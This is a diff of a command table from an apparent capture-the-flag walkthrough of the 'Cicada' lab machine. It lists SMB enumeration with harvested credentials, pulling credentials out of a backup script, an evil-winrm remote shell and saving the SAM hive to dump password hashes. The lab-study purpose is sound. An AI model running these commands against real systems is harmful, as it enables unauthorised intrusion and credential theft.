@@ -51,7 +51,7 @@
 | `crackmapexec smb cicada.htb -u michael.wrightson ... --users` | List users with credentials. |
 | `crackmapexec smb cicada.htb -u david.orelious ... --shares` | Check shares with David's creds. |
 | `smbclient //cicada.htb/DEV -U 'david.orelious%...'` | Connect to "DEV" SMB share. |
-| `get Backup_script.ps1` *(within smbclient)* | Download script. |
+| `get Backup_script.ps1` *(within smbclient)* | Download script. Got emily's credentials here. |
 | `evil-winrm -u emily.oscars ... -i cicada.htb` | Remote shell access. |
 | `whoami /priv` | Check privileges. |
 | `reg save hklm\sam sam` | Save SAM hive. |
